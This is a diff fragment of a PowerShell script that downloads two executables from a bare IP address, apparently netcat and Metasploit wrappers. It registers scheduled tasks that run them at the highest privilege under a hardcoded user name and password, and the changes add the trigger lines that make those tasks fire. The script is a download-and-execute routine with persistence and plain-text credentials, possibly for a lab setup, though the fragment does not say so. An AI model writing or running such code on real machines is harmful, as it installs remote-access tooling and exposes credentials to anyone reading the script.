@@ -11,9 +11,11 @@ Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrappe
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.exe -OutFile C:/windowsWrapperNC.exe;
 $startTime = (get-date).AddMinutes(2).ToString("HH:mm")
 $Action1=New-ScheduledTaskAction -Execute 'Powershell.exe' -WorkingDirectory 'C:/' -Argument '.\windowsWrapperNC.exe';
+$Trigger=New-ScheduledTaskTrigger -Once -At $startTime
 Register-ScheduledTask -TaskName "windowsNC" -Action $Action1 -Trigger $Trigger -RunLevel Highest -User "HashCrackUser1" -Password "This is a basic passphrase";
 Start-ScheduledTask -TaskName "windowsNC" -AsJob
 $startTime = (get-date).AddMinutes(2).ToString("HH:mm")
-$Action1=New-ScheduledTaskAction -Execute Powershell.exe -WorkingDirectory C:/ -Argument '.\windowsWrapperMSF.exe';
+$Action1=New-ScheduledTaskAction -Execute 'Powershell.exe' -WorkingDirectory 'C:/' -Argument '.\windowsWrapperMSF.exe';
+$Trigger=New-ScheduledTaskTrigger -Once -At $startTime
 Register-ScheduledTask -TaskName "windowsMSF" -Action $Action1 -Trigger $Trigger -RunLevel Highest -User "HashCrackUser1" -Password "This is a basic passphrase";
 Start-ScheduledTask -TaskName "windowsMSF" -AsJob
